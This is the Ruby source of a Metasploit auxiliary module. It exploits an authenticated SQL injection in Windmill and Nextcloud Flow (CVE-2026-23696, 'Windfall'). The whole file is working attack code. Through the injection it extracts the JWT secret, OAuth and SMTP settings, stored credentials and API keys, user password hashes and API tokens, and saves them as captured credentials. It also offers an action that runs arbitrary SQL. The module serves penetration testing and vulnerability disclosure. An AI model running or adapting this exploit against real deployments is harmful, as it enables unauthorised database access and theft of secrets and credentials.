
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Windmill
  include Msf::Exploit::Remote::HTTP::Windmill::SQLi
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windmill SQL Injection (Windfall)',
        'Description' => %q{
          Windfall - This module exploits an authenticated SQL injection
          vulnerability (CVE-2026-23696) in Windmill to extract data from the
          PostgreSQL database.

          Windmill is also available as "Flow" - a Nextcloud integration via
          AppAPI. This module supports both standalone Windmill
          and Nextcloud Flow deployments.

          The vulnerability exists in the folder addowner endpoint via JSONB
          path injection. Any authenticated user (including operators) can
          exploit this vulnerability.
        },
        'AKA' => ['Windfall'],
        'Author' => [
          'Valentin Lobstein' # Vulnerability discovery & Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-23696'],
          ['URL', 'https://github.com/Chocapikk/Windfall'],
          ['URL', 'https://chocapikk.com/posts/2026/windfall-nextcloud-flow-windmill-rce/']
        ],
        'DisclosureDate' => '2026-01-10',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        },
        'Actions' => [
          ['QUERY', { 'Description' => 'Execute custom SQL expression' }],
          ['DUMP_SECRETS', { 'Description' => 'Dump global_settings (jwt, smtp, oauth...)' }],
          ['DUMP_RESOURCES', { 'Description' => 'Dump resources (credentials, API keys...)' }],
          ['DUMP_USERS', { 'Description' => 'Dump users' }],
          ['DUMP_TOKENS', { 'Description' => 'Dump API tokens' }]
        ],
        'DefaultAction' => 'DUMP_SECRETS',
        'DefaultOptions' => {
          'RPORT' => 8000,
          'SSL' => false
        }
      )
    )

    register_options([
      OptString.new('USERNAME', [false, 'Windmill username/email']),
      OptString.new('PASSWORD', [false, 'Windmill password']),
      OptString.new('TOKEN', [false, 'Windmill API token']),
      OptString.new('NC_USER', [false, 'Nextcloud username (Flow proxy)']),
      OptString.new('NC_PASS', [false, 'Nextcloud password (Flow proxy)']),
      OptString.new('SQL', [false, 'SQL expression for QUERY action'])
    ])
  end

  def run
    validate_credentials!

    unless windmill_detect_deployment
      print_error('Could not detect Windmill')
      return
    end

    print_status("Detected: #{windmill_deployment_name}")

    if windmill_is_proxy? && (datastore['NC_USER'].blank? || datastore['NC_PASS'].blank?)
      print_error('NC_USER/NC_PASS required for Flow proxy')
      return
    end

    unless authenticate
      print_error('Authentication failed')
      return
    end

    auth_info = windmill_verify_auth
    print_status("Authenticated: #{auth_info[:email]}") if auth_info

    case action.name
    when 'QUERY'
      run_query
    when 'DUMP_SECRETS'
      dump_secrets
    when 'DUMP_RESOURCES'
      dump_resources
    when 'DUMP_USERS'
      dump_users
    when 'DUMP_TOKENS'
      dump_tokens
    end
  end

  private

  def validate_credentials!
    has_token = datastore['TOKEN'].present?
    has_creds = datastore['USERNAME'].present? && datastore['PASSWORD'].present?

    fail_with(Failure::BadConfig, 'Provide TOKEN or USERNAME+PASSWORD') unless has_token || has_creds
  end

  def authenticate
    if datastore['TOKEN'].present?
      @windmill_token = datastore['TOKEN']
      # Skip verify on proxy (whoami endpoint blocked), trust the token
      return true if windmill_is_proxy?

      return windmill_verify_auth
    end

    token = windmill_login(datastore['USERNAME'], datastore['PASSWORD'])
    token.present?
  end

  def run_query
    sql = datastore['SQL']
    if sql.blank?
      print_error('SQL option required')
      return
    end

    print_status("Executing: #{sql}")
    result = windmill_sqli_inject(sql)
    result ? print_good("Result: #{result}") : print_error('Query failed')
  end

  def dump_secrets
    print_status('Dumping all global_settings...')

    # Get count of settings
    count = windmill_sqli_inject('(SELECT count(1) FROM global_settings)').to_i
    print_status("Found #{count} setting(s)")

    # Critical secrets to flag
    critical = %w[jwt_secret license_key scim_token hub_api_secret powershell_repo_pat oauths smtp_settings]

    count.times do |i|
      name = windmill_sqli_inject("(SELECT name FROM global_settings LIMIT 1 OFFSET #{i})")
      next unless name

      value = windmill_sqli_inject("(SELECT value FROM global_settings LIMIT 1 OFFSET #{i})")
      next unless value

      print_line
      if critical.include?(name)
        print_good("#{name}: #{value}")
        store_secret(name, value)
      else
        print_status("#{name}: #{value}")
      end
    end
  end

  def dump_resources
    print_status('Dumping resources (credentials, API keys, DB connections...)...')

    count = windmill_sqli_inject('(SELECT count(1) FROM resource)').to_i
    print_status("Found #{count} resource(s)")

    count.times do |i|
      path = windmill_sqli_inject("(SELECT path FROM resource LIMIT 1 OFFSET #{i})")
      next unless path

      rtype = windmill_sqli_inject("(SELECT resource_type FROM resource LIMIT 1 OFFSET #{i})")
      ws = windmill_sqli_inject("(SELECT workspace_id FROM resource LIMIT 1 OFFSET #{i})")

      value = windmill_sqli_inject("(SELECT value::text FROM resource LIMIT 1 OFFSET #{i})")

      print_line
      print_good("Resource: #{path}")
      print_status("  Workspace: #{ws}") if ws
      print_status("  Type: #{rtype}") if rtype
      print_status("  Value: #{value}") if value

      store_resource(path, rtype, value) if value
    end
  end

  def store_resource(path, rtype, value)
    create_credential(
      module_fullname: fullname,
      origin_type: :service,
      private_data: value,
      private_type: :nonreplayable_hash,
      username: "#{rtype}:#{path}",
      workspace_id: myworkspace_id,
      address: rhost,
      port: rport,
      protocol: 'tcp',
      service_name: 'http'
    )
  end

  def dump_users
    print_status('Dumping users with password hashes...')

    count = windmill_sqli_inject('(SELECT count(1) FROM password)').to_i
    print_status("Found #{count} user(s)")

    count.times do |i|
      email = windmill_sqli_inject("(SELECT email FROM password LIMIT 1 OFFSET #{i})")
      next unless email

      hash = windmill_sqli_inject("(SELECT password_hash FROM password LIMIT 1 OFFSET #{i})")
      admin = windmill_sqli_inject("(SELECT super_admin FROM password LIMIT 1 OFFSET #{i})")
      login = windmill_sqli_inject("(SELECT login_type FROM password LIMIT 1 OFFSET #{i})")

      print_line
      print_good("User: #{email}")
      print_status("  Hash: #{hash}") if hash
      print_status("  Super Admin: #{admin}")
      print_status("  Login Type: #{login}") if login

      store_credential(email, hash || 'unknown')
    end
  end

  def dump_tokens
    print_status('Dumping tokens...')

    count = windmill_sqli_inject('(SELECT count(1) FROM token)').to_i
    print_status("Found #{count} token(s)")

    count.times do |i|
      token = windmill_sqli_inject("(SELECT token FROM token LIMIT 1 OFFSET #{i})")
      next unless token

      email = windmill_sqli_inject("(SELECT email FROM token LIMIT 1 OFFSET #{i})")
      label = windmill_sqli_inject("(SELECT label FROM token LIMIT 1 OFFSET #{i})")

      print_line
      print_good("Token: #{token}")
      print_status("  Email: #{email}") if email
      print_status("  Label: #{label}") if label

      store_credential(email || 'unknown', token)
    end
  end

  def store_secret(name, value)
    create_credential(
      module_fullname: fullname,
      origin_type: :service,
      private_data: value,
      private_type: :nonreplayable_hash,
      username: name,
      workspace_id: myworkspace_id,
      address: rhost,
      port: rport,
      protocol: 'tcp',
      service_name: 'http'
    )
  end

  def store_credential(username, data)
    create_credential(
      module_fullname: fullname,
      origin_type: :service,
      private_data: data,
      private_type: :nonreplayable_hash,
      username: username,
      workspace_id: myworkspace_id,
      address: rhost,
      port: rport,
      protocol: 'tcp',
      service_name: 'http'
    )
  end
end
